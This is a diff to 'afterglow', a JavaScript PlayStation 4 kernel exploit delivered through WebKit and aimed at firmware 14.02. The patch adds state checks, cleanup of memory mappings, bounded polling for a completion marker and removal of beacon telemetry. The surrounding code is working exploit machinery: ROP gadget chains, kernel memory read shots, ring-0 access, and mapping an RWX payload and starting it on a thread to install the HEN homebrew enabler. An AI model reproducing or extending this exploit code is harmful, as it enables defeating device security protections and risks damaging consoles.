@@ -1,6 +1,6 @@
 /*
-    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
-    Port to the raw13 host (WebKit entry), from the Lua original.
+    afterglow -- PlayStation 4 kernel exploit, restricted here to firmware 14.02
+    Port to the raw13 host (WebKit entry), derived from the 14.00 Lua original.
 
     Copyright (C) 2026 well0nez
 
@@ -18,13 +18,13 @@
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-import { int64 } from "./int64.js";
-import { deriveBaseFromLeak, validateKernelHeader } from "./kernel-format-1402.js";
-import { sha256Hex } from "./sha256.js";
+import { int64 } from "./int64.js?v=hen1402r17";
+import { deriveBaseFromLeak, validateKernelHeader } from "./kernel-format-1402.js?v=hen1402r17";
+import { sha256Hex } from "./sha256.js?v=hen1402r17";
 
 const HEN_BIN = {
   length: 498720,
-  sha256: "1c41e9b7f1e5591cfceee0ce11043fab253d1ce53b9d8d2ef60fea0851396406",
+  sha256: "1773444cd5caf62f703e53d6b023882e30c29aba26fc96082f3257e16efa6239",
 };
 const CANDIDATE_READY = true;
 
@@ -32,7 +32,8 @@ const S = {
   read: 3, open: 5, close: 6, unlink: 10, ioctl: 54, mprotect: 74, dup: 41,
   getrlimit: 194, setrlimit: 195,
   socket: 97, setsockopt: 105,
-  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
+  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, munmap: 73,
+  lseek: 478, thr_self: 432,
   getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
   cpuset_setaffinity: 488,
   dynlib_get_list: 592, dynlib_get_info: 593,
@@ -119,7 +120,8 @@ const BOOTSTRAP_WINDOWS = [
 ];
 
 const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false,
-  pthread: null, taperSeed: false, terminalReleaseAttempted: false };
+  pthread: null, pthreadCallEntered: false, pthreadCallReturned: false,
+  taperSeed: false, terminalReleaseAttempted: false };
 
 function host() {
   if (!STATE.ctx) throw new Error("afterglow: no host installed");
@@ -131,15 +133,11 @@ function say(fmt) {
 }
 
 async function checkpoint(name, detail) {
-  const run = host().params && host().params.get("run");
-  if (!run || !/^[0-9]{8,16}-[0-9]{6,20}$/.test(run)) return false;
-  try {
-    const url = "beacon?run=" + encodeURIComponent(run) +
-      "&tag=" + encodeURIComponent(name) +
-      "&detail=" + encodeURIComponent(detail || "");
-    const response = await fetch(url, { cache: "no-store" });
-    return response.ok;
-  } catch (_) { return false; }
+  /* Telemetry is evidence, not part of the exploit ABI. Route it through the
+     host logger so the local collector still receives it, but never make a
+     static host or a failed /beacon request block a kernel or payload step. */
+  try { host().mark(name, detail || ""); } catch (_) {}
+  return true;
 }
 
 const LOW = 0x100000000;
@@ -256,32 +254,34 @@ function cstr(s) {
 }
 
 function notifyHenRunning() {
-  const missing = seedStubs([NOTIFY_SYSCALL]);
-  if (missing.indexOf(NOTIFY_SYSCALL) !== -1) {
-    say("[p] HEN is installed; native notification stub was not found");
-    return { ok: false, note: "syscall 601 stub missing" };
-  }
-
-  const request = alloc(0xc30);
-  wipe(request, 0xc30);
-  request.dv.setUint32(0x10, 0xffffffff, true);
-  request.u8[0x2c] = 1;
-
-  const putAscii = function (offset, capacity, value) {
-    const count = Math.min(value.length, capacity - 1);
-    for (let i = 0; i < count; i++) request.u8[offset + i] = value.charCodeAt(i) & 0xff;
-    request.u8[offset + count] = 0;
-  };
-  putAscii(0x2d, 0x400, "HEN 2.2.0 BETA is running");
-  putAscii(0x42d, 0x400, "cxml://psnotification/tex_icon_system");
-
   try {
+    const missing = seedStubs([NOTIFY_SYSCALL]);
+    if (missing.indexOf(NOTIFY_SYSCALL) !== -1) {
+      say("[p] core installer returned success; native notification stub was not found");
+      return { ok: false, note: "syscall 601 stub missing" };
+    }
+
+    const request = alloc(0xc30);
+    wipe(request, 0xc30);
+    request.dv.setUint32(0x10, 0xffffffff, true);
+    request.u8[0x2c] = 1;
+
+    const putAscii = function (offset, capacity, value) {
+      const count = Math.min(value.length, capacity - 1);
+      for (let i = 0; i < count; i++)
+        request.u8[offset + i] = value.charCodeAt(i) & 0xff;
+      request.u8[offset + count] = 0;
+    };
+    putAscii(0x2d, 0x400, "Core HEN installer returned success");
+    putAscii(0x42d, 0x400, "cxml://psnotification/tex_icon_system");
+
     const rc = sc(NOTIFY_SYSCALL, 0, request.at, 0xc30, 0).i32;
-    say("[p] native HEN running notification rc=" + rc);
+    say("[p] native core-installer notification rc=" + rc);
     return { ok: rc === 0, note: "rc=" + rc };
   } catch (e) {
-    say("[p] HEN is installed; native notification call failed");
-    return { ok: false, note: "call failed" };
+    try { say("[p] core installer returned success; native notification failed"); }
+    catch (_) {}
+    return { ok: false, note: "notification failed" };
   }
 }
 
@@ -1207,52 +1207,62 @@ async function attempt(ctx, opts) {
     say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
     return false;
   }
-  const pin = pinCore();
-  if (!pin.ok) {
-    say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
-    say("  Unpinned, the free and the refill land in different per cpu buckets,");
-    say("  the hole is filled by somebody else, and ring 0 continues on that");
-    say("  stranger's stack pointer. That is a dead console, not a bad run.");
-    return false;
+  /* The completion file is the payload's only positive postcondition. Check
+     it before using the RWX probe so an allocation failure cannot hide a
+     confirmed install. Any error other than ENOENT is an unknown state. */
+  const completionPath = cstr("/user/temp/hen.installed");
+  const completionFd = sc(S.open, completionPath.at, 0).i32;
+  const completionErrno = completionFd < 0 ? host().errno() : 0;
+  if (completionFd >= 0) {
+    const markerClosed = sc(S.close, completionFd).i32 === 0;
+    say("[p] core HEN completion marker found on this boot");
+    await checkpoint("HEN-INSTALLED",
+      "/user/temp/hen.installed is present; close=" + markerClosed);
+    notifyHenRunning();
+    return {
+      payload: true, threadStarted: false, defused: true,
+      installed: true, alreadyOpen: true,
+    };
   }
-  say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");
+  if (completionErrno !== 2) {
+    say("[p] HEN marker could not be checked, errno " + completionErrno +
+      " -- kernel state is unknown");
+    await checkpoint("HEN-MARKER-ERROR", "open errno=" + completionErrno);
+    return {
+      payload: false, threadStarted: false, installed: false,
+      defused: false, unknown: true,
+    };
+  }
 
-  let kernelAlreadyOpen = false;
-  {
-    const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
-    if (m0.i32 !== -1 && sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7).i32 === 0) {
-      const marker = sc(S.open, cstr("/user/temp/hen.installed").at, 0).i32;
-      const markerErrno = marker < 0 ? host().errno() : 0;
-      if (marker >= 0) {
-        const markerClosed = sc(S.close, marker).i32 === 0;
-        say("[p] HEN completion marker found -- HEN is installed on this boot");
-        await checkpoint("HEN-INSTALLED",
-          "/user/temp/hen.installed is present; close=" + markerClosed);
-        notifyHenRunning();
-        return { payload: true, defused: true, installed: true, alreadyOpen: true };
-      }
-      const stagePresent = function (path) {
-        const fd = sc(S.open, cstr(path).at, 0).i32;
-        if (fd < 0) return false;
-        sc(S.close, fd);
-        return true;
-      };
-      const enteredInstall = stagePresent("/user/temp/h14r9.pre");
-      const returnedInstall = stagePresent("/user/temp/h14r9.post");
-      let stageReport = "HEN stopped before the install-payload call";
-      if (returnedInstall) {
-        stageReport = "install_payload returned; the failure happened later in outer HEN";
-      } else if (enteredInstall) {
-        stageReport = "install_payload was entered but did not return";
-      }
-      say("[p] kernel is open but the HEN completion marker is absent, errno " + markerErrno);
-      say("[p] LAST HEN STAGE: " + stageReport);
-      await checkpoint("HEN-MARKER-MISSING",
-        "open errno=" + markerErrno + "; pre=" + enteredInstall +
-        "; post=" + returnedInstall + "; " + stageReport);
-      kernelAlreadyOpen = true;
-    }
+  const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
+  if (m0.i32 === -1 || (m0.hi >>> 0) === 0) {
+    const probeErrno = host().errno();
+    say("[p] kernel-state probe mmap failed, errno " + probeErrno +
+      " -- no exploit or HEN thread started");
+    await checkpoint("KERNEL-STATE-UNKNOWN", "mmap errno=" + probeErrno);
+    return {
+      payload: false, threadStarted: false, installed: false,
+      defused: false, unknown: true,
+    };
   }
+  const probeAt = v(m0.lo, m0.hi);
+  const probeProtect = sc(S.mprotect, probeAt, 0x4000, 7).i32;
+  const probeProtectErrno = probeProtect === 0 ? 0 : host().errno();
+  const probeUnmap = sc(S.munmap, probeAt, 0x4000).i32;
+  if (probeUnmap !== 0)
+    say("[p] kernel-state probe mapping did not unmap, errno " + host().errno());
+
+  if (probeProtect === 0) {
+    say("[p] kernel RWX is already open but the core HEN marker is absent");
+    say("[p] refusing to rewrite a live HEN payload or start a second installer thread");
+    await checkpoint("HEN-STATE-UNKNOWN",
+      "kernel-rwx=open; marker errno=2; no installer started");
+    return {
+      payload: false, threadStarted: false, installed: false,
+      defused: true, alreadyOpen: true, unknown: true,
+    };
+  }
+  say("[p] stock RWX probe rejected as expected, errno " + probeProtectErrno);
 
   let lib = findLib("libSceLibcInternal.sprx");
   if (!lib.base) lib = findLibByShape();
@@ -1278,18 +1288,6 @@ async function attempt(ctx, opts) {
       return false;
     }
     gad[name] = at;
-  }
-
-  if (kernelAlreadyOpen) {
-    say("[p] kernel is already open -- starting another HEN shot directly");
-    const payload = await loadPayloadShots("hen-1402-core.bin", henBytes, true);
-    return {
-      payload: payload === true,
-      threadStarted: STATE.payloadThreadStarted === true,
-      installed: STATE.henInstalled === true,
-      defused: true,
-      alreadyOpen: true,
-    };
   }
 
   /* Choose the descriptor strategy before the first kernel shot. The browser
@@ -1336,6 +1334,19 @@ async function attempt(ctx, opts) {
     }
   }
 
+  /* Pin only when every read-only userland preflight has passed and the first
+     kernel shot is about to be prepared. Earlier exits now leave affinity
+     untouched. */
+  const pin = pinCore();
+  if (!pin.ok) {
+    say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
+    say("  Unpinned, the free and the refill land in different per cpu buckets,");
+    say("  the hole is filled by somebody else, and ring 0 continues on that");
+    say("  stranger's stack pointer. That is a dead console, not a bad run.");
+    return false;
+  }
+  say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");
+
   const shot = shooter(gad);
   const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);
 
@@ -1348,6 +1359,8 @@ async function attempt(ctx, opts) {
     if (!await checkpoint("leak-armed", "first kernel read shot")) {
       say("[1] PC collector did not acknowledge the shot"); return false;
     }
+    if (typeof ctx.markKernelStageEntered === "function")
+      ctx.markKernelStageEntered();
     const r = shot.take(function (c) {
       c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
       c.grab(win.at, TUNE.window);
@@ -1603,6 +1616,13 @@ async function attempt(ctx, opts) {
       " rwx before=" + before + " after=" + after);
   await checkpoint("bootstrap-returned", "ioctl=" + ioctlRv + " rwx=" + before + "/" + after);
 
+  /* These anonymous mappings are only permission probes. Their results have
+     already been captured, so release both before any payload allocation. */
+  const m1Unmap = m1Good ? sc(S.munmap, v(m1.lo, m1.hi), 0x4000).i32 : 0;
+  const m2Unmap = m2Good ? sc(S.munmap, v(m2.lo, m2.hi), 0x4000).i32 : 0;
+  if (m1Unmap !== 0 || m2Unmap !== 0)
+    say("[6] permission-probe unmap failed " + m1Unmap + "/" + m2Unmap);
+
   const k = openRing0(hostFree);
   const thread = (before !== 0 && after === 0) ? k.thread() : null;
   const gated = thread !== null && inHeap(thread);
@@ -1772,21 +1792,28 @@ async function attempt(ctx, opts) {
       say("[p] corrected HEN thread did not start");
     }
   } catch (e) {
-    iface.payload = false;
+    iface.threadStarted = STATE.payloadThreadStarted === true;
+    iface.installed = STATE.henInstalled === true;
+    iface.payload = iface.installed;
+    iface.unknown = (STATE.pthreadCallEntered === true &&
+      STATE.pthreadCallReturned !== true) ||
+      (iface.threadStarted && !iface.installed);
     say("[p] Error starting corrected HEN: " + (e && e.message));
+    if (iface.unknown)
+      say("[p] pthread state is unknown or incomplete -- no retry on this boot");
   }
 
   say("[p] HEN shot finished; kernel patches " + done + "/" + PATCHES.length +
-      "; pthread start=" + !!iface.payload + "; HEN status unconfirmed");
+      "; pthread start=" + !!iface.threadStarted +
+      "; completion marker=" + (iface.installed ? "confirmed" : "not confirmed"));
   return iface;
 }
 
 /* ------------------------------------------------------- Payload Loader */
 
 async function loadPayloadShots(url, blob, defused) {
-  /* Unlimited mode retries failed exploit acquisition, not a HEN pthread.
-     pthread_create returning only proves the thread started; without a join
-     or completion marker it may still be inside install_payload. Starting a
+  /* This path makes one pthread_create call. Its return only proves the
+     thread started; the completion marker is required before success. A
      second copy would stack installers in the same kernel. */
   return loadPayload(url, blob, defused);
 }
@@ -1848,6 +1875,8 @@ async function loadPayload(url, vorab, defused) {
   const c = host();
   STATE.payloadThreadStarted = false;
   STATE.henInstalled = false;
+  STATE.pthreadCallEntered = false;
+  STATE.pthreadCallReturned = false;
   let blob = vorab || null;
   if (blob === null) {
     blob = await fetchBytes(url, "p");
@@ -1866,6 +1895,15 @@ async function loadPayload(url, vorab, defused) {
   if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
     say("[p] mmap failed, errno " + c.errno()); return false;
   }
+  let mappingLive = true;
+  const releaseUnstartedMapping = function (reason) {
+    if (!mappingLive) return true;
+    const rv = sc(S.munmap, entry, size).i32;
+    if (rv === 0) mappingLive = false;
+    else say("[p] payload mapping cleanup failed after " + reason +
+      ", errno " + c.errno());
+    return rv === 0;
+  };
   
   for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
   say("[p] payload mapping is writable; copying final code before execution");
@@ -1882,11 +1920,15 @@ async function loadPayload(url, vorab, defused) {
     for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
     const q = c.p.read8(plus(entry, o));
     if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
-      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
+      say("[p] copy mismatch at 0x" + o.toString(16));
+      releaseUnstartedMapping("copy mismatch");
+      return false;
     }
   }
   if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
-    say("[p] final mprotect rwx failed, errno " + c.errno()); return false;
+    say("[p] final mprotect rwx failed, errno " + c.errno());
+    releaseUnstartedMapping("mprotect failure");
+    return false;
   }
   say("[p] final payload mapping committed RW -> RWX");
   
@@ -1895,28 +1937,35 @@ async function loadPayload(url, vorab, defused) {
   const fn = STATE.pthread;
   if (!fn) {
     say("[p] pthread_create could not be resolved exactly from libkernel -- not calling it");
+    releaseUnstartedMapping("unresolved pthread_create");
     return false;
   }
-  const stagePrePath = cstr("/user/temp/h14r9.pre");
-  const stagePostPath = cstr("/user/temp/h14r9.post");
-  sc(S.unlink, stagePrePath.at);
-  sc(S.unlink, stagePostPath.at);
-  say("[p] cleared previous r9 handoff markers before starting HEN");
   if (!await checkpoint("pthread-armed", "starting corrected HEN thread")) {
     say("[p] PC collector did not acknowledge payload start");
+    releaseUnstartedMapping("blocked pthread start");
     return false;
   }
 
   const thr = alloc(8);
   thr.u8.fill(0);
+  STATE.pthreadCallEntered = true;
   const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
-  const handle = qAt(thr, 0);
-  const started = rc === 0 && (handle.hi >>> 0) > 0;
+  STATE.pthreadCallReturned = true;
+  /* pthread_create's return code is the ABI success result. The pthread_t
+     representation is opaque, so never reinterpret its bit pattern as an
+     additional success condition. */
+  const started = rc === 0;
   STATE.payloadThreadStarted = started;
-  await checkpoint("pthread-returned", "rc=" + rc + " handle=" + text(handle));
+  let handleText = "unreadable";
+  try { handleText = text(qAt(thr, 0)); }
+  catch (_) { say("[p] pthread_t could not be read; pthread_create rc=" + rc); }
+  await checkpoint("pthread-returned", "rc=" + rc + " handle=" + handleText);
   say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
       + (started ? " -- running" : " -- did NOT start"));
-  if (!started) return false;
+  if (!started) {
+    releaseUnstartedMapping("pthread_create rejection");
+    return false;
+  }
 
   /* HEN runs inside this WebProcess. Do not release the exploit heap or
      navigate away until HEN's own end-of-install marker appears; the previous
@@ -1926,30 +1975,46 @@ async function loadPayload(url, vorab, defused) {
   const wait = function (ms) {
     return new Promise(function (resolve) { setTimeout(resolve, ms); });
   };
-  let markerClosed = false, markerErrno = 0;
-  /* Do not run any ROP/syscall work while the new HEN pthread is starting.
-     A known successful 14.02 run produced its marker just after 15 seconds,
-     so leave a full 30-second window and make only one marker check. */
-  await wait(30000);
-  const marker = sc(S.open, markerPath.at, 0).i32;
-  if (marker >= 0) {
-    markerClosed = sc(S.close, marker).i32 === 0;
-    STATE.henInstalled = true;
-  } else {
+  let markerClosed = false, markerErrno = 0, elapsed = 0;
+  /* Do no ROP/syscall work for the first 30 seconds. Then observe the same
+     completion file at bounded intervals without ever starting a second
+     pthread. The additional reads only distinguish late success from an
+     unknown/unfinished installer. */
+  const markerWaits = [30000, 10000, 10000, 10000];
+  for (let i = 0; i < markerWaits.length && !STATE.henInstalled; i++) {
+    await wait(markerWaits[i]);
+    elapsed += markerWaits[i];
+    const marker = sc(S.open, markerPath.at, 0).i32;
+    if (marker >= 0) {
+      markerClosed = sc(S.close, marker).i32 === 0;
+      STATE.henInstalled = true;
+      break;
+    }
     markerErrno = c.errno();
+    if (markerErrno !== 2) {
+      await checkpoint("HEN-MARKER-ERROR",
+        "pthread started; elapsed=" + elapsed + "ms; open errno=" + markerErrno);
+      say("[p] completion marker check failed with errno " + markerErrno +
+        "; installer state is unknown and no retry will run");
+      return false;
+    }
+    await checkpoint("HEN-MARKER-WAIT",
+      "pthread started; elapsed=" + elapsed + "ms; marker absent with ENOENT");
   }
 
   if (!STATE.henInstalled) {
     await checkpoint("HEN-MARKER-TIMEOUT",
-      "pthread started; one marker check after 30s was absent; errno=" + markerErrno);
-    say("[p] HEN thread is still unconfirmed after 30 seconds; no second thread was started");
+      "pthread started; bounded checks through " + elapsed +
+      "ms were absent; errno=" + markerErrno);
+    say("[p] core installer is still unconfirmed after " + (elapsed / 1000) +
+      " seconds; no second thread was started");
     return false;
   }
 
   await checkpoint("HEN-INSTALLED",
     "/user/temp/hen.installed is present; close=" + markerClosed);
   notifyHenRunning();
-  say("[p] HEN completion marker confirmed; notification attempted");
+  say("[p] core installer returned zero; completion marker and notification attempted");
   await wait(1000);
 
   if (defused === true && typeof c.releaseAfterPayloadStart === "function") {
@@ -1958,7 +2023,7 @@ async function loadPayload(url, vorab, defused) {
     try {
       released = c.releaseAfterPayloadStart({
         payload: true, defused: true, installed: true,
-        rc: rc, handle: text(handle),
+        rc: rc, handle: handleText,
       });
     } catch (_) {}
     return true;
@@ -1984,6 +2049,8 @@ export async function runAfterglow(ctx, opts) {
     STATE.batch = undefined;
     STATE.retry = false;
     STATE.pthread = null;
+    STATE.pthreadCallEntered = false;
+    STATE.pthreadCallReturned = false;
     STATE.taperSeed = false;
     STATE.terminalReleaseAttempted = false;
   }
